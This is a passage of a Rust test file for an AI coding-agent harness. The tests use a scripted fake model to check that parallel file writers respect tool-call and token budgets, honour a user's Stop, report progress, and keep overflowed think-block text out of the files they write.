    assert_eq!(fs::read_to_string(folder.join("b.txt")).unwrap(), "beta\n");
    assert!(!folder.join("c.txt").exists());
    assert!(
        fake.fed().contains("the first call is used"),
        "{}",
        fake.fed()
    );
}

/// With one tool call left, a reply of three new files writes only the first: no writer runs for
/// a call the budget refuses.
#[test]
fn a_batch_never_runs_writers_past_the_tool_calls_budget() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("notes");
    fs::create_dir(&folder).unwrap();
    no_plan(&fake);
    let data = tmp.path().join("data");
    calls(
        &fake,
        &[
            write("a.txt", "the alpha note"),
            write("b.txt", "the beta note"),
            write("c.txt", "the gamma note"),
        ],
    );
    fake.say("alpha");
    fake.say("Done.");
    fake.say("Done.");
    let overrides = Overrides {
        test_cmd: None,
        allowed_paths: None,
        check_cmds: vec![],
        // The plan takes one; one is left.
        budget: Budget {
            tool_calls: 2,
            ..k(1)
        },
    };
    let task = CodeTask::in_folder("write three notes", &folder, &data, overrides).unwrap();
    let mut notices = String::new();
    let sink = &mut |event| {
        if let AgentEvent::Notice(n) = event {
            notices += &n;
        }
    };
    (wide().run_with(&fake.larch, &task, &data, sink, &mut |_| Decision::Once)).unwrap();
    assert!(!notices.contains("at once"), "{notices}");
    assert_eq!(fs::read_to_string(folder.join("a.txt")).unwrap(), "alpha\n");
    assert!(!folder.join("b.txt").exists() && !folder.join("c.txt").exists());
}

/// A batch's writers count against the tokens budget when they are done, even the texts a Stop
/// at the first ask leaves unwritten.
#[test]
fn every_batch_writer_counts_its_tokens() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("notes");
    fs::create_dir(&folder).unwrap();
    no_plan(&fake);
    let data = tmp.path().join("data");
    calls(
        &fake,
        &[
            write("a.txt", "the alpha note"),
            write("b.txt", "the beta note"),
            write("c.txt", "the gamma note"),
        ],
    );
    const X: usize = 300;
    let mut ids = vec![fake.byte(b'x'); 3 * X];
    ids.extend([fake.tokenizer.eos().unwrap(); 3]);
    fake.say_tokens(&ids);
    let task = untested("write three notes", &folder, &data);
    let outcome = (wide().run_with(&fake.larch, &task, &data, &mut |_| {}, &mut |_| {
        Decision::Stop
    }))
    .unwrap();
    assert_eq!(fake.unsaid(), 0);
    assert!(outcome.tokens >= 3 * X as u64, "{}", outcome.tokens);
    assert!(!folder.join("a.txt").exists());
}

/// Stop pressed while a batch writes leaves every file unwritten, the one whose writer ended
/// before the Stop too.
#[test]
fn a_stop_while_a_batch_writes_writes_no_file() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("notes");
    fs::create_dir(&folder).unwrap();
    no_plan(&fake);
    let data = tmp.path().join("data");
    calls(
        &fake,
        &[
            write("a.txt", "the alpha note"),
            write("b.txt", "the beta note"),
        ],
    );
    // The lanes take turns: one text ends at its second token, the other runs on, and Stop
    // comes at its 250th.
    let (x, eos) = (fake.byte(b'x'), fake.tokenizer.eos().unwrap());
    let mut ids = vec![x, x, eos];
    ids.extend([x; 600]);
    ids.push(eos);
    fake.say_tokens(&ids);
    let task = untested("write two notes", &folder, &data);
    let stop = Arc::new(AtomicBool::new(false));
    let mut sink = |e: AgentEvent| {
        if matches!(&e, AgentEvent::Progress(t) if t.contains(", 250 tokens")) {
            stop.store(true, Ordering::Relaxed);
        }
    };
    let ask = &mut |_: &larch_agent::code::allow::Ask| Decision::Once;
    let outcome = (wide().run_until(&fake.larch, &task, &data, &mut sink, ask, &stop)).unwrap();
    let stopped = outcome.packet.stopped.as_deref();
    assert_eq!(stopped, Some("the user stopped the run"));
    assert!(!folder.join("a.txt").exists() && !folder.join("b.txt").exists());
}

/// The progress lines of `events` that say a file is being written.
fn writing(events: &[AgentEvent]) -> Vec<&str> {
    (events.iter())
        .filter_map(|e| match e {
            AgentEvent::Progress(t) if t.starts_with("Writing ") => Some(t.as_str()),
            _ => None,
        })
        .collect()
}

/// A writer whose think block its budget cut goes on thinking where the answer shows, a draft
/// and its doubts, and ends that with its own `</think>`, which no open block hides: only the
/// text after it is the file.
#[test]
fn a_writers_thinking_past_its_budget_never_lands_in_the_file() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("robot");
    fs::create_dir(&folder).unwrap();
    no_plan(&fake);
    let data = tmp.path().join("data");
    call(
        &fake,
        "write_file",
        json!({"path": "a.h", "about": "x"}),
        false,
    );
    // Past the writer's budget at 32k (`Room::writer`), which the engine cuts with its close.
    let mut ids = vec![fake.token("<think>")];
    ids.extend(vec![fake.byte(b'x'); 4096]);
    ids.push(fake.token("</think>"));
    ids.extend(fake.tokenizer.encode(
        "```cpp\nint draft;\n```\nWait, the brief says to reply with only the file's text.\n",
        false,
    ));
    ids.push(fake.token("</think>"));
    ids.extend(fake.tokenizer.encode("\n\n```cpp\nint x;\n```", false));
    ids.push(fake.tokenizer.eos().unwrap());
    fake.say_tokens(&ids);
    fake.say("Done.");
    fake.say("Done.");
    let task = untested("write a.h", &folder, &data);
    (code().run_with(&fake.larch, &task, &data, &mut |_| {}, &mut |_| {
        Decision::Once
    }))
    .unwrap();
    assert_eq!(fs::read_to_string(folder.join("a.h")).unwrap(), "int x;\n");
}

#[test]
fn a_writer_says_how_far_it_has_written() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("notes");
    fs::create_dir(&folder).unwrap();
    no_plan(&fake);
    let data = tmp.path().join("data");
    call(
        &fake,
        "write_file",
        json!({"path": "a.txt", "about": "x"}),
        false,
    );
    let mut ids = vec![fake.byte(b'x'); 1100];
    ids.push(fake.tokenizer.eos().unwrap());
    fake.say_tokens(&ids);
    fake.say("Done.");
    fake.say("Done.");
    let task = untested("write a note", &folder, &data);
    let mut seen = Vec::new();
    (code().run_with(
        &fake.larch,
        &task,
        &data,
        &mut |e| seen.push(e),
        &mut |_| Decision::Once,
    ))
    .unwrap();
    assert_eq!(
        writing(&seen),
        [
            // The writer thinks first at 32k (`Room::writer`), which sends no text.
            "Writing a.txt (thinking)",
            "Writing a.txt, 250 tokens",
            "Writing a.txt, 500 tokens",
            "Writing a.txt, 750 tokens",
            "Writing a.txt, 1,000 tokens",
        ]
    );
}

/// Writers side by side each say which file they write.
#[test]
fn writers_side_by_side_each_name_their_file() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("notes");
    fs::create_dir(&folder).unwrap();
    no_plan(&fake);
    let data = tmp.path().join("data");
    calls(&fake, &[write("a.txt", "alpha"), write("b.txt", "beta")]);
    let mut ids = vec![fake.byte(b'x'); 1200];
    ids.extend([fake.tokenizer.eos().unwrap(); 2]);
    fake.say_tokens(&ids);
    fake.say("Done.");
    fake.say("Done.");
    let task = untested("write two notes", &folder, &data);
    let mut seen = Vec::new();
    let sink = &mut |e: AgentEvent| {
        if matches!(&e, AgentEvent::Notice(n) if n.contains(" at once")) {
            fake.stall(Duration::from_secs(1));
        }
        seen.push(e);
    };
    (wide().run_with(&fake.larch, &task, &data, sink, &mut |_| Decision::Once)).unwrap();
    let lines = writing(&seen);
    for name in ["a.txt", "b.txt"] {
        let lane = format!("Writing {name}, 250 tokens");
        assert!(lines.contains(&lane.as_str()), "{lines:?}");
    }
}
